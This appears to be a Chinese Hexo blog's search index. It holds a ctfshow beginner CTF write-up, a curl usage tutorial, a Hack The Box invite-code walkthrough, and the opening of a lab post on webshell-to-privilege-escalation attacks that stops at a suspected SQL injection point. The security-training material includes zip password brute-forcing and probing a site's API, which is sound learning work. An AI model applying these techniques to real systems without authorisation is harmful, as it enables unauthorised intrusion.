<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CtfShow萌新区WP</title>
    <url>/posts/25127/</url>
    <content><![CDATA[<h1>前言</h1>
<p>对，我就是萌新，哭哭。<br>
萌新系列需要萌新码开启，按照第一题提示加群即可获得<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/DDB74BA5D9F54D97E757A1B862D52268.gif" width = "200" height = "200" style="float: left;"/></p>
<h1>crypto</h1>
<h2 id="密码1"><a class="header-anchor" href="#密码1">¶</a>密码1</h2>
<p>给出了一串16进制的数据，我们先转换成str<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/_FDUR7%7B_ZR%7BCBF%28LSX9%5D69S.png" alt=""><br>
得到一串base64编码的数据，我们再去解一下base64<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/J%25OCNJY%40%29BW%7D%5DBVU%29Q_P8PS.png" alt=""><br>
解码后得到一串栅栏密码，再去解一下<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/%28Y5DCLQXOI%24%29MQ7DLZA36%288.png" alt=""><br>
在栏数为19的时候得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;dffb06a33eeeb0d259c84bd8cf146d08-&#125;</span><br></pre></td></tr></table></figure>
<h2 id="密码2"><a class="header-anchor" href="#密码2">¶</a>密码2</h2>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%812/IO2LW3_4X%24VPD56%25%5D422DWS.png" alt=""><br>
我们去看一下键盘，发现被rdcvbg 2qase3 6tghu7分别包围的键是f、w和y<br>
于是按照格式得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;fwy&#125;</span><br></pre></td></tr></table></figure>
<h2 id="密码3"><a class="header-anchor" href="#密码3">¶</a>密码3</h2>
<p>题目给出一段字符，看起来是莫斯密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. &#x2F;-- -.. -- -.. -.. --&#x2F; -- -- -- -- -- &#x2F;-- -.. -.. -- -.. -- &#x2F;-- -.. -.. -- </span><br></pre></td></tr></table></figure>
<p>解密后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MORSEnullISnullCOOLnullBUTnullBACONnullISnullCOOLERnullMMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</span><br></pre></td></tr></table></figure>
<p>结合题目提示培根，只处理尾部M和D，将M转换成A，D转换成B</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AABBABABAAABBBABABBAAAAAAABBABAABBA</span><br></pre></td></tr></table></figure>
<p>再进行培根密码解密<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%813/2719%7B%7D%24~3%5BWB_M%28I%291N%5DNL2.png" alt=""></p>
<h2 id="密码4"><a class="header-anchor" href="#密码4">¶</a>密码4</h2>
<p>给出一串base64编码，去解码一下<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/Z0_%7D%28ACQDPSWIDCT%7B7ZN%24_F.png" alt=""><br>
再次base家族base85解密<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/04JMGQ%293%28%60W39UZ%24PK~F%5DUT.png" alt=""><br>
得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;base_base_base&#125;</span><br></pre></td></tr></table></figure>
<h1>misc</h1>
<h2 id="萌新-隐写2"><a class="header-anchor" href="#萌新-隐写2">¶</a>萌新_隐写2</h2>
<p>下载文件得到一个加密的zip压缩包<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/E%296IXVG444M%24KA5B1%25%29_1XN.png" alt=""><br>
提示我们是密码是生日，所以最长有8位数字，直接压缩包爆破<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/KY4P%25ODWTF1NV%7B1HAWHF%7DU3.png" alt=""><br>
得到压缩包密码为：19981000<br>
打开压缩包后得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;brute_force&#125;</span><br></pre></td></tr></table></figure>
<h2 id="萌新隐写3"><a class="header-anchor" href="#萌新隐写3">¶</a>萌新隐写3</h2>
<p>这题直接打开图片地址，就有flag，emmm<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%993/B9XXQPT35%7BX4%40%7BFNUL8BA6Y.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;xinti_gkd&#125;</span><br></pre></td></tr></table></figure>
<h2 id="萌新隐写4"><a class="header-anchor" href="#萌新隐写4">¶</a>萌新隐写4</h2>
<p>下载的是一个doc文档<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/QQ%E6%88%AA%E5%9B%BE20210115224404.png" alt=""><br>
这里光标停在下边多一行，猜测可能有文字被隐藏了，所以我们去选项打开显示一下隐藏文字<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/DRO%7DID7PMHA8X%285P%24X%7D%254%5B6.png" alt=""><br>
得到flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/7G8X7YG1%601~MKYZZO2F%40%282J.png" alt=""><br>
当然还有一种办法，就是crtl+a全选复制到外面(隐藏的文字一起被选中)，就可以看到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;word_stega&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>curl的使用</title>
    <url>/posts/25992/</url>
    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介">¶</a>简介</h2>
<p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。</p>
<p>我们可以不借助一些额外安装的工具或者插件，通过curl命令就可以完成一些我们日常的工作。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/somethings/curl1121.png" alt=""></p>
<p>不带有任何参数时，curl 就是发出 GET 请求。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令向<code>www.example.com</code>发出 GET 请求，服务器返回的内容会在命令行输出。</p>
<h2 id="A"><a class="header-anchor" href="#A">¶</a><strong>-A</strong></h2>
<p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -A <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将<code>User-Agent</code>改成 Chrome 浏览器。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -A <span class="string">&#x27;&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会移除<code>User-Agent</code>标头。</p>
<p>也可以通过<code>-H</code>参数直接指定标头，更改<code>User-Agent</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;User-Agent: php/1.0&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="b"><a class="header-anchor" href="#b">¶</a><strong>-b</strong></h2>
<p><code>-b</code>参数用来向服务器发送 Cookie。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;foo=bar&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会生成一个标头<code>Cookie: foo=bar</code>，向服务器发送一个名为<code>foo</code>、值为<code>bar</code>的 Cookie。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;foo1=bar;foo2=bar2&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令发送两个 Cookie。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b cookies.txt https://www.google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令读取本地文件<code>cookies.txt</code>，里面是服务器设置的 Cookie（参见<code>-c</code>参数），将其发送到服务器。</p>
<h2 id="c"><a class="header-anchor" href="#c">¶</a><strong>-c</strong></h2>
<p><code>-c</code>参数将服务器设置的 Cookie 写入一个文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -c cookies.txt https://www.google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件<code>cookies.txt</code>。</p>
<h2 id="d"><a class="header-anchor" href="#d">¶</a><strong>-d</strong></h2>
<p><code>-d</code>参数用于发送 POST 请求的数据体。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d<span class="string">&#x27;login=emma＆password=123&#x27;</span>-X POST https://google.com/login</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ curl -d <span class="string">&#x27;login=emma&#x27;</span> -d <span class="string">&#x27;password=123&#x27;</span> -X POST  https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>
<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d <span class="string">&#x27;@data.txt&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>
<h2 id="–data-urlencode"><a class="header-anchor" href="#–data-urlencode">¶</a><strong>–data-urlencode</strong></h2>
<p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --data-urlencode <span class="string">&#x27;comment=hello world&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>
<h2 id="e"><a class="header-anchor" href="#e">¶</a><strong>-e</strong></h2>
<p><code>-e</code>参数用来设置 HTTP 的标头<code>Referer</code>，表示请求的来源。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -e <span class="string">&#x27;https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将<code>Referer</code>标头设为<code>https://google.com?q=example</code>。</p>
<p><code>-H</code>参数可以通过直接添加标头<code>Referer</code>，达到同样效果。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Referer: https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="F"><a class="header-anchor" href="#F">¶</a><strong>-F</strong></h2>
<p><code>-F</code>参数用来向服务器上传二进制文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p>
<p><code>-F</code>参数可以指定 MIME 类型。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;type=image/png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p>
<p><code>-F</code>参数也可以指定文件名。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;filename=me.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code>。</p>
<h2 id="G"><a class="header-anchor" href="#G">¶</a><strong>-G</strong></h2>
<p><code>-G</code>参数用来构造 URL 的查询字符串。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -G -d <span class="string">&#x27;q=kitties&#x27;</span> -d <span class="string">&#x27;count=20&#x27;</span> https://google.com/search</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令会发出一个 GET 请求，实际请求的 URL 为<code>https://google.com/search?q=kitties&amp;count=20</code>。如果省略<code>--G</code>，会发出一个 POST 请求。</p>
<p>如果数据需要 URL 编码，可以结合<code>--data--urlencode</code>参数。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -G --data-urlencode <span class="string">&#x27;comment=hello world&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="H"><a class="header-anchor" href="#H">¶</a><strong>-H</strong></h2>
<p><code>-H</code>参数添加 HTTP 请求的标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;Accept-Language: en-US&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令添加 HTTP 标头<code>Accept-Language: en-US</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;Accept-Language: en-US&#x27;</span> -H <span class="string">&#x27;Secret-Message: xyzzy&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令添加两个 HTTP 标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d <span class="string">&#x27;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令添加 HTTP 请求的标头是<code>Content-Type: application/json</code>，然后用<code>-d</code>参数发送 JSON 数据。</p>
<h2 id="i"><a class="header-anchor" href="#i">¶</a><strong>-i</strong></h2>
<p><code>-i</code>参数打印出服务器回应的 HTTP 标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -i https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。</p>
<h2 id="I"><a class="header-anchor" href="#I">¶</a><strong>-I</strong></h2>
<p><code>-I</code>参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -I https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令输出服务器对 HEAD 请求的回应。</p>
<p><code>--head</code>参数等同于<code>-I</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --head https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="k"><a class="header-anchor" href="#k">¶</a><strong>-k</strong></h2>
<p><code>-k</code>参数指定跳过 SSL 检测。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -k https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令不会检查服务器的 SSL 证书是否正确。</p>
<h2 id="L"><a class="header-anchor" href="#L">¶</a><strong>-L</strong></h2>
<p><code>-L</code>参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -L -d <span class="string">&#x27;tweet=hi&#x27;</span> https://api.twitter.com/tweet</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="–limit-rate"><a class="header-anchor" href="#–limit-rate">¶</a><strong>–limit-rate</strong></h2>
<p><code>--limit-rate</code>用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --limit-rate 200k https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将带宽限制在每秒 200K 字节。</p>
<h2 id="o"><a class="header-anchor" href="#o">¶</a><strong>-o</strong></h2>
<p><code>-o</code>参数将服务器的回应保存成文件，等同于<code>wget</code>命令。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -o example.html https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将<code>www.example.com</code>保存成<code>example.html</code>。</p>
<h2 id="O"><a class="header-anchor" href="#O">¶</a><strong>-O</strong></h2>
<p><code>-O</code>参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -O https://www.example.com/foo/bar.html</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令将服务器回应保存成文件，文件名为<code>bar.html</code>。</p>
<h2 id="s"><a class="header-anchor" href="#s">¶</a><strong>-s</strong></h2>
<p><code>-s</code>参数将不输出错误和进度信息。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。</p>
<p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s -o /dev/null https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="S"><a class="header-anchor" href="#S">¶</a><strong>-S</strong></h2>
<p><code>-S</code>参数指定只输出错误信息，通常与<code>-s</code>一起使用。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -S -o /dev/null https://google.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令没有任何输出，除非发生错误。</p>
<h2 id="u"><a class="header-anchor" href="#u">¶</a><strong>-u</strong></h2>
<p><code>-u</code>参数用来设置服务器认证的用户名和密码。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -u <span class="string">&#x27;bob:12345&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令设置用户名为<code>bob</code>，密码为<code>12345</code>，然后将其转为 HTTP 标头<code>Authorization: Basic Ym9iOjEyMzQ1</code>。</p>
<p>curl 能够识别 URL 里面的用户名和密码。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://bob:12345@google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -u <span class="string">&#x27;bob&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令只设置了用户名，执行后，curl 会提示用户输入密码。</p>
<h2 id="v"><a class="header-anchor" href="#v">¶</a><strong>-v</strong></h2>
<p><code>-v</code>参数输出通信的整个过程，用于调试。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -v https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>--trace</code>参数也可以用于调试，还会输出原始的二进制数据。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --trace - https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="x"><a class="header-anchor" href="#x">¶</a><strong>-x</strong></h2>
<p><code>-x</code>参数指定 HTTP 请求的代理。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令指定 HTTP 请求通过<code>myproxy.com:8080</code>的 socks5 代理发出。</p>
<p>如果没有指定代理协议，默认为 HTTP。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -x james:cats@myproxy.com:8080 https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令中，请求的代理使用 HTTP 协议。</p>
<h2 id="X"><a class="header-anchor" href="#X">¶</a><strong>-X</strong></h2>
<p><code>-X</code>参数指定 HTTP 请求的方法。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -X POST https://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令对<code>https://www.example.com</code>发出 POST 请求。</p>
<h2 id="T"><a class="header-anchor" href="#T">¶</a>-T</h2>
<p><code>-T</code>参数可以用于请求体文件</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -T <span class="string">&quot;&#123;file1,file2&#125;&quot;</span> http://www.example.com</span><br></pre></td></tr></table></figure>
</blockquote>
<br>
<br>
<br>
<p>本篇博文基于阮一峰的网络日志进行修改和补充</p>
<p>阮一峰大大的传送门：<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
]]></content>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack The Box账号注册</title>
    <url>/posts/33946/</url>
    <content><![CDATA[<h2 id="引言"><a class="header-anchor" href="#引言">¶</a>引言</h2>
<p>hack the box 是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面分享一下过程。</p>
<h2 id="正文"><a class="header-anchor" href="#正文">¶</a>正文</h2>
<p>打开网站注册的时候，提示需要自己入侵网站获取注册</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/psc.png" alt=""></p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/13.jpg" alt=""></p>
<p>在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/132165.png" alt=""></p>
<p>跑去查看js文件源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/894.png" alt=""></p>
<p>发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试~</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/165123.png" alt=""></p>
<p>给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"> </span><br><span class="line">upperdict = &#123;&#125;  </span><br><span class="line">lowerdict = &#123;&#125;  </span><br><span class="line">upperletters =string.ascii_uppercase</span><br><span class="line">lowerletters =string.ascii_lowercase<span class="comment">#：所有小写字母</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">dststr = []  </span><br><span class="line">oristr = input(<span class="string">&#x27;Enter string to rot13:&#x27;</span>)<span class="comment">#版本3.0不能用raw_input</span></span><br><span class="line">print(<span class="string">&#x27;Your string ro en/crypt was :&#x27;</span>,oristr ) </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(lowerletters)):                       <span class="comment">#把所有小写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(upperletters)):                       <span class="comment">#把所有大写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> oristr:  </span><br><span class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> lowerdict:  </span><br><span class="line">		dststr.append(lowerdict[ch])  </span><br><span class="line">	<span class="keyword">elif</span> ch <span class="keyword">in</span> upperdict:  </span><br><span class="line">		dststr.append(upperdict[ch])  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		dststr.append(ch)  </span><br><span class="line">dststr = <span class="string">&#x27;&#x27;</span>.join(dststr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print(<span class="string">&#x27;the rot13 string is:&#x27;</span>,dststr ) </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/sff2132.png" alt=""></p>
<p><strong>解密结果：</strong></p>
<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
<p>要想获得注册邀请码，必须使用post方式向此处地址发送请求获取，于是我们马不停蹄得溜去发送请求~~</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/1231321.png" alt=""></p>
<p>返回一段被base64方式加密的密文，我们再次跑去解密base64</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;SElNRFctSURTRUwtQkZUVEQtTFBJUkQtSFlTWUI=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(str)</span><br><span class="line"></span><br><span class="line">print(temp.decode())</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png" alt=""></p>
<p>这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！</p>
]]></content>
  </entry>
  <entry>
    <title>模拟网站攻击到提权的全部过程</title>
    <url>/posts/46463/</url>
    <content><![CDATA[<h1>前言</h1>
<p>今天去给新一届的学生演示一次网站拿webshell到系统提权的过程，但不幸的是中间翻车了，老年人紧张得忘记了msf监听木马的指令，然后哆哆嗦嗦的在大家眼下，打开了笔记查看一下2333…所以更新一下博客，给自己一个教训QWQ。</p>
<h1>准备工作</h1>
<p>靶机（被攻击方）：win7系统<br>
入侵者（攻击方）：win10系统、kali系统</p>
<p>首先启动win7系统，搭建一个常见的校园网站，然后映射到局域网，使得我们能正常访问<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EUAM0%5DFV1UHQ43O%246FPAM11.png" alt=""></p>
<h1>从网站拿到webshell</h1>
<h2 id="sql注入漏洞"><a class="header-anchor" href="#sql注入漏洞">¶</a>sql注入漏洞</h2>
<p>把整个网站浏览完一遍后，我们发现这里的url为?id=10结尾，我们猜测可能是一个sql注入点<br>
